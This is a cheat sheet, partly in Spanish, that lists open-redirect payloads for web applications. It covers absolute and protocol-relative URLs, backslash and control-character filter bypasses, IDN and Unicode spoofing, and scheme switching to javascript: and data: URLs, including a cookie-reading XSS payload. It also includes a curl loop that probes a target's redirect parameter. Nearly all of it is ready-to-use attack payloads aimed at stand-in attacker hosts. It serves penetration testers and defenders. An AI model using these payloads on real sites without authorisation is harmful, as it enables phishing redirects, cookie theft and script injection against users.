---
aliases:
  - Open Redirect Basic Payloads
  - Protocol-Relative Redirect
  - Scheme Switching
tags:
  - type/cheatsheet
  - vuln/open-redirect
  - technique/initial-access
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Open Redirect]]'
---
# Open Redirect - Vectores Básicos

***

## URL Absoluta Completa

| **Payload** | **Resultado esperado** | **Notas** |
|:---:|:---:|:---:|
| `https://attacker.com` | Redirect 302 a attacker.com | Vector más simple. |
| `http://attacker.com` | Redirect HTTP | Si target HTTPS-only, falla. |
| `https://attacker.com/` | Trailing slash | Same effect. |
| `https://attacker.com/path?p=1` | Con path + query | Custom landing. |
| `https://attacker.com/#fragment` | Fragment preservado | Client-side data. |
| `https://attacker.com:8080` | Custom port | Port allowed by target validator? |
| `https://user:pass@attacker.com` | Userinfo en URL | Some browsers warn — bypass tricks. |
| `https://attacker.com\@target.com` | Backslash before @ | Some parsers split. |
| URL con %00 | `https://attacker.com%00.target.com` | Null byte truncation. |
| URL con unicode lookalike | `https://аttacker.com` (Cyrillic а) | IDN spoofing. |
| URL con punycode | `xn--ttacker-...` | Encoded IDN. |
| URL con %2F prefix | `%2F%2Fattacker.com` | URL-encoded slash. |
| URL con whitespace | `https://attacker.com %20foo` | Trim varies. |
^or-vector-absolute

### Probes con curl

```bash
# Test cada vector
for p in 'https://attacker.com' 'http://attacker.com' '//attacker.com' '\\\\attacker.com'; do
  echo "=== $p ==="
  curl -sI "https://target/login?next=$(echo $p | jq -sRr @uri)" | grep -i location
done
```

___

## Protocol-Relative URLs

| **Payload** | **Resultado** | **Notas** |
|:---:|:---:|:---:|
| `//attacker.com` | Browser usa scheme actual (http o https) | Most common bypass. |
| `//attacker.com/path` | Con path | Combine. |
| `\\attacker.com` | Backslash variant — Windows-style | Some parsers tratan como protocol-relative. |
| `\/\/attacker.com` | Mixed escape | Some validators no manejan. |
| `\\\\attacker.com` | Doble backslash | Edge case. |
| `////attacker.com` | Multiple slashes | Browser normaliza a `//`. |
| `/\attacker.com` | Slash + backslash | Confusión. |
| `//attacker.com/legit-path` | Domain con legit path | Spoof intent. |
| `// attacker.com` (con espacio) | Whitespace | Algunos browsers strip. |
| `///attacker.com` | Triple slash | Browser-specific normalization. |
^or-vector-protocol-relative

### Browser parsing differences

| Browser | `//evil.com` | `\\evil.com` | `\/\/evil.com` |
|---|---|---|---|
| Chrome | Redirects | Redirects | Redirects |
| Firefox | Redirects | Treats as path | Redirects |
| Safari | Redirects | Treats as path | Redirects |
| IE/Edge legacy | Redirects | Redirects | Edge |

___

## Scheme Switching

| **Payload** | **Resultado** | **Notas** |
|:---:|:---:|:---:|
| `javascript:alert(1)` | XSS via redirect | Many apps filter `javascript:`. |
| `JaVaScRiPt:alert(1)` | Mixed case bypass | Filter case-sensitive? |
| `\tjavascript:alert(1)` | Tab prefix | Some parsers strip. |
| ` javascript:alert(1)` | Space prefix | Browser tolerates. |
| `javascript&#58;alert(1)` | HTML entity colon | If reflected en HTML. |
| `data:text/html,<script>alert(1)</script>` | data: URL | Modern browsers more strict. |
| `data:text/html;base64,...` | Base64 data URL | Compact. |
| `vbscript:msgbox(1)` | IE legacy | Old browsers. |
| `livescript:` | Netscape legacy | Historic. |
| `mocha:` | Netscape legacy | Historic. |
| `mailto:attacker@evil.com` | Email client launch | Less impact. |
| `tel:+1234567890` | Phone call | Mobile vector. |
| `intent:` (Android) | App launch | Mobile-specific. |
| `file://` (browser-blocked usually) | Local file | Edge. |
| `chrome:` (chrome://) | Browser internal | Blocked usually. |
| Browser-specific schemes | `slack://`, `whatsapp://`, `tg://` | App handoff. |
^or-vector-scheme

### XSS via javascript: scheme

```
?next=javascript:alert(document.cookie)
?redirect=jAvAsCrIpT:alert(1)
?url=javas%09cript:alert(1)  ← URL-encoded tab
```

Si app pasa value directamente a `Location:` header, browser ejecuta JS en ciertas condiciones (depending on browser + redirect type).

___

## Backslash / Control Char Tricks

| **Payload** | **Notas** |
|:---:|:---:|
| `\\attacker.com` | Treated as protocol-relative en Chrome. |
| `https:\\attacker.com` | Backslash en lugar de `//`. |
| `https:/\attacker.com` | Mixed. |
| `https:\/attacker.com` | Mixed. |
| `https:\/\/attacker.com` | Escaped. |
| `https://target.com\@attacker.com` | Backslash split before @. |
| `https://target.com\.attacker.com` | Backslash in domain. |
| `\rhttps://attacker.com` | CR prefix. |
| `\nhttps://attacker.com` | LF prefix. |
| `\thttps://attacker.com` | Tab prefix. |
| `‮https://attacker.com` | Right-to-left override Unicode (visual spoof). |
| `https%3A%2F%2Fattacker.com` | URL-encoded. |
| `https:%2F%2Fattacker.com` | Mixed encode. |
| `https:%5C%5Cattacker.com` | URL-encoded backslash. |
| Null byte `\x00` | `https://target.com%00@attacker.com` | Truncation. |
^or-vector-control

***
